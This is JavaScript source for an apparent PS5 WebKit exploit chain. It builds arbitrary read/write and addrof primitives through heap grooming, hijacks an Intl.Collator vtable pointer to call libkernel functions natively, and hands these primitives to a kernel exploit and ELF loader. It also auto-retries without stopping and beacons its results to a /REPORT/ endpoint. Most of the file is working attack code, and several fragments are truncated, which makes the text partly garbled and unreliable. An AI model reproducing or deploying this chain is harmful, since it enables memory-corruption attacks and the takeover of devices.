    const v = Q.get(name);

    const out = [];

        if (Number.isFinite(raw) && raw > 0) out.push(raw);

const LOG_ON = Q.get("log") === "1"
    || (Q.get("log") !== "0" && !/github\.io$/i.test(location.hostname));

function mark(tag, extra) {
    seq++;
    const line = `a${attemptNumber}-r${navigationID}-s${seq}-note-${tag}`
        + (extra !== undefined ? `-${extra}` : "");
    if (LOG_ON) {
        try {

function failed() {
    // Relentless mode: never stop for the user. Reset and try again.
    mark("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
    stopped = false;
    retryScheduled = false;
    catState("run");
    setCaption(`Poopsploit — PS5 FW ${FW_LABEL}`);
    showStatus(`retrying  (attempt ${attemptNumber + 1})`, "run");
    setTimeout(() => {
        try { history.replaceState(null, ""); } catch {}
        attemptNumber++;

function uint32At(bytes, offset) {
    return bytes[offset]

        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000;

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;

function putLow48(bytes, offset, value) {
    if (!plausibleAddress(value))
        throw new Error("putLow48-invalid-value");
    const high = Math.floor(value / 0x100000000);
    const low = value - high * 0x100000000;
    bytes[offset] = low & 0xff;
    bytes[offset + 1] = Math.floor(low / 0x100) & 0xff;
    bytes[offset + 2] = Math.floor(low / 0x10000) & 0xff;
    bytes[offset + 3] = Math.floor(low / 0x1000000) & 0xff;
    bytes[offset + 4] = high & 0xff;
    bytes[offset + 5] = Math.floor(high / 0x100) & 0xff;
    bytes[offset + 6] = 0;

}

    for (let i = 0; i < count; ++i) {

        && value <= 9007199254740991

function plausibleAddress(value) {
    return value > 0x100000000

            && canonicalLow48(collatorHeader, 0x28)
            && collatorHeader[0x30] === 1
            && collatorHeader[0x33] === 0;
        for (let saveCollator = 0; saveCollator < collatorOriginal.length;
            ++saveCollator)
            collatorOriginal[saveCollator] = collatorHeader[0x18 + saveCollator];

        aimCarrier(candidate, compareFnAddress);
        const compareHeaderRepeated = readTwiceMatches(compareFnHeader, rwView,
            BOUND_COMPARE_BYTES);
        const compareSID = uint32At(compareFnHeader, 0);
        compareFnHeaderOK = compareHeaderRepeated
            && compareSID >= 0x4000 && compareSID < 0x08000000
            && (compareSID & 0xf) === 0 && compareFnAddress % 8 === 0
            && compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a
            && compareFnHeader[6] === 0x0c
            && (compareFnHeader[7] === 0 || compareFnHeader[7] === 1)
            && typeof compareFn === "function";

        naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
        fakeUCollatorAddress = arenaBacking + FAKE_UCOLLATOR_OFFSET;
        fakeVtableAddress = arenaBacking + FAKE_VTABLE_OFFSET;
        arenaLayoutOK = arenaViewHeaderOK && arenaBackingRepeated
            && kernelBaseOK && arenaBacking % 0x10 === 0
            && fakeUCollatorAddress >= arenaBacking
            && fakeUCollatorAddress + 0xe8 <= arenaBacking + ARENA_BYTES
            && fakeVtableAddress >= arenaBacking
            && fakeVtableAddress + 0x130 <= arenaBacking + ARENA_BYTES
            && getpidStatus === 1
            && notifyAddressOK
            && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
            && notifyEntryAddress >= kernelBase
            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE
            && naturalTrampolineAddress >= kernelBase
            && naturalTrampolineAddress < kernelBase + KERNEL_TEXT_SIZE;

        if (arenaLayoutOK && holderHeaderOK && functionHeaderOK
            && nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated
            && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
            && collatorHeaderOK && compareFnHeaderOK) {
            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00,
                fakeVtableAddress);
            for (let zeroRdi = 0; zeroRdi < 8; ++zeroRdi)
                arenaView[FAKE_UCOLLATOR_OFFSET + 0x48 + zeroRdi] = 0;
            for (let zeroRcx = 0; zeroRcx < 8; ++zeroRcx)
                arenaView[FAKE_UCOLLATOR_OFFSET + 0x60 + zeroRcx] = 0;
            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0,
                notifyEntryAddress);
            putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128,
                naturalTrampolineAddress);

            arenaFilledOK = low48StoredExactly(arenaView,
                    FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress)
                && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x48,
                    FAKE_UCOLLATOR_OFFSET + 0x50)
                && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x60,
                    FAKE_UCOLLATOR_OFFSET + 0x68)
                && low48StoredExactly(arenaView,
                    FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress)
                && low48StoredExactly(arenaView,
                    FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
        }

        notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
            && getpidStatus === 1 && notificationRequestOK
            && notifyAddressOK;
        if (notifyReady) {
            aimCarrier(candidate, realCollatorAddress + 0x18);
            carrierArmedForCommit = sameBytes(rwView, collatorOriginal,
                collatorOriginal.length);
            notifyReady = notifyReady && carrierArmedForCommit;
        }

        if (!notifyReady) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            targetView[0] = 0xa5;
            rwMirror[0] = 0x3c;
            restoreObserved = rwView[0] === 0x3c
                && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
        } else {
            rwVectorTouched = false;
            restoreObserved = rwMirror[0] === 0x3c
                && targetView[0] === 0xa5;
        }
        // slopkit-lapse: keep the aliased cell alive for the runtime shim.
        // The original null-out is preserved for the retry-failed path via
        // the catch below.
        if (notifyReady) {
            lapseCandidate = candidate;
        }
        candidate = null;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        retrySafe = candidate === null && result === null
            && !rwHeaderCaptured && error?.name === "TypeError";
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch {}
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try { restoreCarrier(candidate); } catch {}
        }
        candidate = null;
        result = null;
        try { targetView[0] = 0xa5; } catch {}
        try { rwMirror[0] = 0x3c; } catch {}
        try { clearPredecessor(); } catch {}
        compositionError = error;
        compositionState = -1;
    }
}

function reportComposition() {
    if (compositionState < 0) {
        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            `${compositionError?.name}:`
            + String(compositionError?.message).slice(0, 80));
        mark("DONE-THROW", `predecessor-cleared=true-retry-safe=${retrySafe}`
            + `-candidate-seen=${candidateEverReturned}`
            + `-candidate-mutated=${candidateMutationStarted}`);
        if (!retrySafe) {
            try { sessionStorage.setItem(blockKey, "1"); } catch {}
            failed();
        }
        if (retrySafe)
            scheduleSafeRetry("placement-throw");
        return;
    }

    if (compositionState === 2) {
        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
        mark("DONE-MISS", "predecessor-cleared=true-retry-safe=true"
            + "-candidate-seen=false-candidate-mutated=false");
        scheduleSafeRetry("normal-clone-miss");
        return;
    }

    if (compositionState === 3) {
        const mismatchTag = zeroHeaderMiss ? "ZERO-HEADER-MISS"
            : (retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH");
        mark(mismatchTag, `rw=${rwHeaderOK}`
            + `-holder=${holderHeaderOK}`
            + `-function=${functionHeaderOK}`
            + `-native-executable=${nativeExecutableHeaderOK}`
            + `-base=${webkitBaseOK}`
            + `-repeat=${pointersRepeated}`
            + `-retry-safe=${retrySafe}`
            + `-candidate-seen=${candidateEverReturned}`
            + `-candidate-mutated=${candidateMutationStarted}`
            + `-zero-header-miss=${zeroHeaderMiss}`
            + "-carrier-restored=true");
        mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
        mark("WALK-BYTES-HEX", dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
        if (!retrySafe) {
            try { sessionStorage.setItem(blockKey, "1"); } catch {}
            failed();
        }
        if (retrySafe)
            scheduleSafeRetry(zeroHeaderMiss
                ? "zero-header-miss" : "composition-length-mismatch");
        return;
    }

    if (compositionState === 0) {
        mark("NO-RESULT", "critical-load-did-not-finish");
        failed();
        return;
    }

    mark("SSV-RETURNED-CLEARED", `length=${compositionLength}`
        + "-predecessor-cleared=true");
    mark("RW-CARRIER", `sid=${hex(uint32At(rwHeader, 0))}`
        + `-vector=${hex(rwOriginalVector)}`
        + `-length=0x100-mode=0x${rwHeader[0x28].toString(16)}`);
    mark("HOLDER", `cell=${hex(targetAddress)}`
        + `-header-pass=${holderHeaderOK}`);
    mark("JSFUNCTION", `parseInt=${hex(nativeTargetAddress)}`
        + `-sid=${hex(functionStructureID)}`
        + `-executable=${hex(executableAddress)}`);
    mark("NATIVE-EXECUTABLE", `P=${hex(executableAddress)}`
        + `-sid=${hex(nativeExecutableStructureID)}`);
    mark("NATIVE-CALL-TARGET", `parseInt=${hex(nativeFunctionAddress)}`
        + `-constructor=${hex(nativeConstructorAddress)}`);
    mark("WEBKIT-BASE", `${hex(webkitBase)}`
        + `-parseInt-rva=${hex(PARSEINT_NATIVE_OFFSET)}`
        + `-constructor-rva=${hex(HOST_CONSTRUCTOR_OFFSET)}`
        + `-text-size=${hex(WEBKIT_TEXT_SIZE)}`);
    mark("IMPORT-WINDOWS", `A=${hex(webkitBase + IMPORT_WINDOW_A_OFFSET)}`
        + `+${hex(IMPORT_WINDOW_A_BYTES)}`
        + `-B=${hex(webkitBase + IMPORT_WINDOW_B_OFFSET)}`
        + `+${hex(IMPORT_WINDOW_B_BYTES)}`
        + `-address-ok=${gotWindowAddressesOK}`
        + `-read-twice=${gotWindowsRepeated}`
        + `-canonical=${gotCanonicalOK}`);
    mark("REQUIREMENTS-IMPORTS", `A=${hex(requirementsObjectA)}`
        + `-B=${hex(requirementsObjectB)}`);
    mark("REQUIREMENTS-BASE", `${hex(requirementsBase)}`
        + `-paired=true-pass=${requirementsBaseOK}`);
    mark("LIBC-IMPORTS-1", `cxa_finalize=${hex(cxaFinalizePointer)}`
        + `:${importStatusName(cxaFinalizeStatus)}`
        + `-strlen=${hex(strlenPointer)}:${importStatusName(strlenStatus)}`);
    mark("LIBC-IMPORTS-2", `strerror=${hex(strerrorPointer)}`
        + `:${importStatusName(strerrorStatus)}`
        + `-memchr=${hex(memchrPointer)}:${importStatusName(memchrStatus)}`);
    mark("LIBC-BASE", `${hex(libcBase)}-equations=${libcResolvedCount}`
        + `-pass=${libcBaseOK}`);
    mark("KERNEL-IMPORTS-1", `object=${hex(kernelObjectPointer)}`
        + `-close=${hex(closePointer)}:${importStatusName(closeStatus)}`
        + `-error=${hex(errorPointer)}:${importStatusName(errorStatus)}`);
    mark("KERNEL-IMPORTS-2", `getpid=${hex(getpidPointer)}`
        + `:${importStatusName(getpidStatus)}`
        + `-pthread_getspecific=${hex(pthreadGetspecificPointer)}`
        + `:${importStatusName(pthreadGetspecificStatus)}`);
    mark("KERNEL-BASE", `${hex(kernelBase)}-equations=${kernelResolvedCount}`
        + `-object-anchor=${kernelObjectBaseOK}-pass=${kernelBaseOK}`);
    mark("ARENA-CELL", `view=${hex(arenaViewAddress)}`
        + `-backing=${hex(arenaBacking)}`
        + `-size=${hex(ARENA_BYTES)}`
        + `-header-pass=${arenaViewHeaderOK}`
        + `-sentinel-pass=${arenaBackingRepeated}`);
    mark("COLLATOR", `cell=${hex(realCollatorAddress)}`
        + `-m_collator=${hex(realCollatorAddress + 0x18)}`
        + `-original=${hex(low48At(collatorHeader, 0x18))}`
        + `-compare=${hex(compareFnAddress)}`
        + `-search-prewarmed=${collatorHeaderOK}`);
    mark("NOTIFY-ARENA", `B=${hex(fakeUCollatorAddress)}`
        + `-V=${hex(fakeVtableAddress)}`
        + `-virtual-slot=${hex(fakeVtableAddress + 0x128)}`);
    mark("NOTIFY-TRAMPOLINE", `${hex(naturalTrampolineAddress)}`
        + `-libkernel-rva=${hex(NATURAL_TRAMPOLINE_OFFSET)}`
        + "-natural-rsp=true-bytes=488b8fe000000051488b4f60488b7f48c3");
    mark("NOTIFY-TARGET", `${hex(notifyEntryAddress)}`
        + `-libkernel-rva=${hex(NOTIFY_OFFSET)}`
        + `-address-ok=${notifyAddressOK}`
        + "-offline-verified-fw=11.60-xotext-not-read=true");
    mark("NOTIFY-CONTEXT", "B+48-rdi=0-device"
        + "-B+60-rcx=0-nonblocking-B+e0=notification-export"
        + `-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
    mark("NOTIFY-REQUEST", `size=${hex(NOTIFICATION_REQUEST_SIZE)}`
        + `-message-offset=${hex(NOTIFICATION_MESSAGE_OFFSET)}`
        + `-ascii=true-layout-pass=${notificationRequestOK}`
        + `-prewarm-result=${notificationPrewarmResult}`);
    mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
    mark("NATIVE-EXECUTABLE-HEX",
        dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
    mark("IMPORT-WINDOW-A-HEX", dumpHex(importWindowA1, IMPORT_WINDOW_A_BYTES));
    mark("IMPORT-WINDOW-B-HEX", dumpHex(importWindowB1, IMPORT_WINDOW_B_BYTES));

    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
        && nativeExecutableHeaderOK && webkitBaseOK
        && pointersRepeated && restoreObserved
        && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
        && arenaViewHeaderOK && arenaBackingRepeated
        && collatorHeaderOK && compareFnHeaderOK
        && getpidStatus === 1
        && notifyAddressOK
        && notificationRequestOK
        && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
        && compositionLength === EXPECTED_LENGTH;
    try {
        sessionStorage.setItem(blockKey, "1");
        sessionStorage.setItem(passKey, "pending");
        commitBlockConfirmed = sessionStorage.getItem(blockKey) === "1"
            && sessionStorage.getItem(passKey) === "pending";
    } catch {
        commitBlockConfirmed = false;
    }

    if (leakPass) {
        mark("MODULE-IMPORT-LEAK-PASS",
            "windows-read-twice=true-provider-crosschecks=true"
            + "-holder-targets-validated=true-notification-target-verified=true");
    } else {
        mark("MODULE-IMPORT-LEAK-MISMATCH", `rw=${rwHeaderOK}`
            + `-function=${functionHeaderOK}`
            + `-native=${nativeExecutableHeaderOK}`
            + `-base=${webkitBaseOK}`
            + `-repeat=${pointersRepeated}-got=${gotReadOK}`
            + `-requirements=${requirementsBaseOK}`
            + `-libc=${libcBaseOK}-kernel=${kernelBaseOK}`
            + `-restore=${restoreObserved}`);
    }

    mark("ROOTS-LIVE", `rw-mirror=${rwMirror[0].toString(16)}`
        + `-guard-byte=${targetView[0].toString(16)}`
        + `-parseInt-type=${typeof nativeTarget}`
        + `-length-word=${lengthWord.keep.toString(16)}`);
    if (leakPass && notifyReady && carrierArmedForCommit
        && commitBlockConfirmed) {
        mark("NOTIFY-PLAN-PASS", `arena-filled=${arenaFilledOK}`
            + "-carrier-parked-at-collator-field=true");
        mark("NONFATAL-NATIVE-CALL-NEXT",
            "system-notification-via-natural-stack-no-kernel-exploit");
        setTimeout(commitNotificationProof, 250);
        return;
    }

    mark("NOTIFY-PLAN-MISMATCH", `ready=${notifyReady}`
        + `-arena=${arenaLayoutOK}-filled=${arenaFilledOK}`
        + `-collator=${collatorHeaderOK}`
        + `-compare=${compareFnHeaderOK}`
        + `-request=${notificationRequestOK}`
        + `-target=${notifyAddressOK}`
        + `-carrier-armed=${carrierArmedForCommit}`
        + `-repeat-block=${commitBlockConfirmed}`);
    failed();
    setTimeout(() => { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
}

function commitNotificationProof() {
    if (!notifyReady || !carrierArmedForCommit || !commitBlockConfirmed
        || commitStarted) {
        mark("COMMIT-ABORT", "state-changed-before-commit");
        failed();
        return;
    }

    for (let before = 0; before < collatorOriginal.length; ++before) {
        if (rwView[before] !== collatorOriginal[before]) {
            mark("COMMIT-ABORT", "collator-bytes-changed-before-commit");
            failed();
            return;
        }
    }
    if (rwView[0x1b] !== 0) {
        mark("COMMIT-ABORT", "ascii-tristate-no-longer-false");
        failed();
        return;
    }
    if (!notificationRequestOK
        || notificationRequest.length !== NOTIFICATION_REQUEST_SIZE) {
        mark("COMMIT-ABORT", "notification-request-changed-before-commit");
        failed();
        return;
    }

    commitStarted = true;
    const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
    scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
    scratchWords[1] = fakeHigh;
    let notifyResult = 0;
    let callError = null;
    for (let commitByte = 0; commitByte < 8; ++commitByte)
        rwView[commitByte] = scratchBytes[commitByte];

    try {
        notifyResult = compareFn(notificationRequest, "b");
    } catch (error) {
        callError = error;
    }

    for (let restoreByte = 0; restoreByte < collatorOriginal.length;
        ++restoreByte)
        rwView[restoreByte] = collatorOriginal[restoreByte];
    let collatorRestored = true;
    for (let verifyRestore = 0; verifyRestore < collatorOriginal.length;
        ++verifyRestore) {
        if (rwView[verifyRestore] !== collatorOriginal[verifyRestore])
            collatorRestored = false;
    }

    // NOTE (slopkit-lapse port): the original notify.html tears down rwView
    // here. We keep it alive so lapse-runtime can use aimCarrier + rwView as
    // the R/W primitive.
    //
    //   fakeHost.q2 = null;
    //   rwView = null;
    //   rwMirror = null;
    //   rwBuffer = null;

    const notifyReturned = !callError && collatorRestored
        && Number.isFinite(notifyResult)
        && Math.floor(notifyResult) === notifyResult;
    const notificationSent = notifyReturned && notifyResult === 0;
    let passPersisted = false;
    if (notificationSent) {
        try {
            sessionStorage.setItem(passKey, "1");
            passPersisted = sessionStorage.getItem(passKey) === "1";
        } catch {}
    }

    if (notificationSent && passPersisted) {
        mark("NOTIFY-NATIVE-CALL-PASS", "result=0"
            + "-collator-restored=true-permanent-block=true");
        succeeded(`result=0 attempt=${attemptNumber}`);
        handoffToLapse();
    } else if (callError) {
        mark("NOTIFY-CALL-THREW", `${callError?.name}`
            + `:${String(callError?.message).slice(0, 80)}`
            + `-collator-restored=${collatorRestored}`);
        failed();
    } else if (notificationSent) {
        mark("NOTIFY-PASS-STORAGE-FAIL", "result=0"
            + "-collator-restored=true");
        succeeded(`result=0 attempt=${attemptNumber}`);
        handoffToLapse();
    } else if (notifyReturned) {
        const notifyResultU32 = notifyResult < 0
            ? notifyResult + 0x100000000 : notifyResult;
        mark("NOTIFY-NATIVE-CALL-RETURN", `error=${hex(notifyResultU32)}`
            + `-signed=${notifyResult}`
            + "-collator-restored=true");
        failed();
    } else {
        mark("NOTIFY-RETURN-MISMATCH", `result=${notifyResult}`
            + `-collator-restored=${collatorRestored}`);
        failed();
    }
    setTimeout(() => { mark("SURVIVED-NOTIFY-T1000"); }, 1000);
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        const predecessor = buffer(PREDECESSOR_SIZE);
        const finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
            + `-fake=${hex(fakeAddress)}`);

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch {}
        retrySafe = true;
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        finishEarlySafeAttempt("ADDROF-NO-RESULT",
            "capture-task-did-not-finish", "addrof-no-result");
        return;
    }
    if (captureState < 0) {
        finishEarlySafeAttempt("ADDROF-THREW",
            `${captureError?.name}:`
            + String(captureError?.message).slice(0, 80),
            "addrof-threw");
        return;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
    mark("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
        + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);

    if (!(repeated && distinct && plausible && sourceCovered)) {
        finishEarlySafeAttempt("ADDROF-FAIL",
            `repeat=${repeated}-distinct=${distinct}`
            + `-plausible=${plausible}-covered=${sourceCovered}`,
            "addrof-validation");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
            `target=${hex(targetAddress)}`, "target-address");
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
            `host=${hex(hostAddress)}`, "fake-address");
        return;
    }
    mark("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
        + "-delta=0x10");
    runGroomAndLoad();
}

catState("run");

mark("BOOT", `rev=${REVISION}-k=${K}-n=${DRAIN_COUNT}`
    + `-attempt=${attemptNumber}-armed=${armed}-loop=relentless`);

if (!armed) {
    stopped = true;
    catState("run");
    showStatus("open with ?go=1", "run");
} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
    || typeof Symbol !== "function" || typeof history === "undefined"
    || typeof history.replaceState !== "function") {
    mark("UNSUPPORTED");
    showStatus("unsupported browser", "bad");
} else {
    // No pass/block latch: every armed load runs fresh so it can be re-run.
    alreadyPassed = false;
    alreadyBlocked = false;
    try {
        sessionStorage.removeItem(passKey);
        sessionStorage.removeItem(blockKey);
    } catch {}
    startAttempt();
}

////////////////////////////////////////////////////////////////////////////
// slopkit -> lapse handoff
//
// At this point the WebKit sandbox is popped and the collator vtable trick
// has been demonstrated by firing a system notification. We now keep the
// R/W primitive alive, expose it as window.slopkit, then load lapse-runtime
// + lapse.js + elfldr.js in sequence.
////////////////////////////////////////////////////////////////////////////

let lapseHandoffDone = false;

function reissueNotification(msg) {
    // Reuse the collator vtable one-shot for a new message. Rewrites the
    // notification request buffer to `msg` (ASCII, padded to size), re-arms
    // the arena, and re-invokes compareFn. Requires rwView etc. still alive.
    if (!rwView) return -1;
    try {
        const trailing = NOTIFICATION_REQUEST_SIZE
            - NOTIFICATION_MESSAGE_OFFSET - msg.length;
        if (trailing < 1) return -2;
        const req = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
            + String(msg) + "\x00".repeat(trailing);

        // Rearm the fake UCollator arena and the compare function slot.
        const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
        scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
        scratchWords[1] = fakeHigh;
        for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];

        const r = compareFn(req, "b");

        // Restore the collator bytes so JS still holds a valid Collator.
        for (let i = 0; i < collatorOriginal.length; ++i)
            rwView[i] = collatorOriginal[i];

        return r;
    } catch (e) {
        return -3;
    }
}

async function handoffToLapse() {
    if (lapseHandoffDone) return;
    lapseHandoffDone = true;
    mark("POOPS-HANDOFF-BEGIN", `fw=${FW_LABEL}`);

    // 1. Load the per-fw lapse offset table.
    let lapseOffsets = null;
    try {
        const r = await fetch("offsets/lapse-offsets.json",
            { cache: "no-store" });
        if (r.ok) {
            const all = await r.json();
            lapseOffsets = all[FW_LABEL] || null;
        }
    } catch (e) {
        mark("POOPS-OFFSETS-LOAD-FAIL", String(e && e.message).slice(0, 80));
    }
    if (!lapseOffsets) {
        mark("POOPS-OFFSETS-MISSING", `fw=${FW_LABEL}`);
    }

    // 2. Expose primitives as window.slopkit.
    //
    // realCollatorAddress + collatorOriginal are needed by lapse-runtime.js
    // to re-arm the collator's m_ucollator pointer before each ROP-chain
    // dispatch. The notify path tore down that pointer at the end; every
    // subsequent compareFn() call has to re-wire it to fakeUCollatorAddress
    // and restore it after, exactly like reissueNotification() does.
    window.slopkit = {
        candidate: null,   // patched below
        rwView: rwView,
        aimCarrier: aimCarrier,
        restoreCarrier: restoreCarrier,
        arenaView: arenaView,
        arenaBacking: arenaBacking,
        fakeUCollatorAddress: fakeUCollatorAddress,
        fakeVtableAddress: fakeVtableAddress,
        compareFn: compareFn,
        realCollator: realCollator,
        realCollatorAddress: realCollatorAddress,
        collatorOriginal: collatorOriginal,   // Uint8Array snapshot
        // targetHolder + its cell address + a few known-address inline
        // properties are what lapse-runtime uses to bootstrap addrof:
        //   scan targetHolder's memory for a JSValue matching one of the
        //   known addresses (parseInt / arenaView / realCollator) to
        //   discover the byte offset of each property slot; then read
        //   arbitrary object addresses by writing the target into a slot
        //   and reading that slot back.
        targetHolder: targetHolder,
        targetAddress: targetAddress,
        nativeTargetAddress: nativeTargetAddress,
        arenaViewAddress: arenaViewAddress,
        hostAddress: hostAddress,
        fakeHost: fakeHost,
        kernelBase: kernelBase,
        webkitBase: webkitBase,
        naturalTrampolineAddress: naturalTrampolineAddress,
        notifyEntryAddress: notifyEntryAddress,
        FW_VERSION: FW_LABEL,
        lapseOffsets: lapseOffsets,
        screenLine: screenLine,
        mark: mark,
        sendNotification: reissueNotification,

        // Low-level "arm collator, fire compareFn(arg1, arg2), restore".
        // Runtime uses this so we don't duplicate the re-arm logic and can
        // guarantee the JS Collator object is left in a valid state.
        armAndFire: function (arg1, arg2) {
            if (!rwView) throw new Error("armAndFire: rwView torn down");
            // aim at realCollator + 0x18 (m_ucollator ptr slot)
            aimCarrier(lapseCandidate, realCollatorAddress + 0x18);
            const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
            scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
            scratchWords[1] = fakeHigh;
            for (let i = 0; i < 8; ++i) rwView[i] = scratchBytes[i];
            let r, err = null;
            try { r = compareFn(arg1, arg2); }
            catch (e) { err = e; }
            // restore collator bytes
            for (let i = 0; i < collatorOriginal.length; ++i)
                rwView[i] = collatorOriginal[i];
            if (err) throw err;
            return r;
        },
    };

    window.slopkit.candidate = lapseCandidate;
    if (!lapseCandidate) {
        mark("POOPS-CANDIDATE-MISSING",
            "notifyReady-path-did-not-save-cell");
    } else {
        mark("POOPS-CANDIDATE-OK", `cell=${hex(targetAddress)}`);
    }

    // 3. Load runtime + lapse.js + elfldr.js.
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const s = document.createElement("script");
            s.src = src;
            s.onload = () => resolve();
            s.onerror = () => reject(new Error("load fail: " + src));
            document.body.appendChild(s);
        });
    }

    // Beacon helper: findings go back as /REPORT/ URLs, which the host prints
    // in its own log. Reading results off a TV is not practical.
    function report(tag, obj) {
        var q = [];
        for (var k in obj)
            q.push(encodeURIComponent(k) + "=" + encodeURIComponent(String(obj[k])));
        try {
            fetch("/REPORT/" + tag + "?" + q.join("&"), {cache: "no-store"})
                .catch(function () {});
        } catch (e) {}
    }

    // --- port first -----------------------------------------------------
    // It binds lazily, so the runtime need not exist yet. This also means its
    // report survives whatever keeps killing the renderer in the stage below.
    try {
        await loadScript("netctrl-ps5.js");
        const defined = (typeof window.netctrl_ps5 !== "undefined");
        mark("NETCTRL-JS-LOADED", "defined=" + defined);
        report("netctrl_early", {
            defined: defined ? 1 : 0,
            version: defined ? window.netctrl_ps5.version : "none",
            syscalls: defined ? Object.keys(window.netctrl_ps5.SYSCALL_NUMS).length : 0,
            fw: (window.slopkit && window.slopkit.FW_VERSION) || "?",
            wk: (window.slopkit && window.slopkit.webkitBase)
                ? "0x" + BigInt(window.slopkit.webkitBase).toString(16) : "none",
            lk: (window.slopkit && window.slopkit.kernelBase)
                ? "0x" + BigInt(window.slopkit.kernelBase).toString(16) : "none"
        });
    } catch (e) {
        mark("NETCTRL-JS-LOAD-FAIL", String(e && e.message).slice(0, 60));
        report("netctrl_early", {error: String(e && e.message).slice(0, 120)});
    }

    try {
        await loadScript("lapse-runtime.js");
        mark("POOPS-RUNTIME-LOADED");
        report("runtime", {loaded: 1});
    } catch (e) {
        mark("POOPS-RUNTIME-LOAD-FAIL", String(e && e.message).slice(0, 80));
        report("runtime", {error: String(e && e.message).slice(0, 120)});
        return;
    }

    // Upstream's lapseRuntimeSelfTest() is skipped. It drives the runtime's
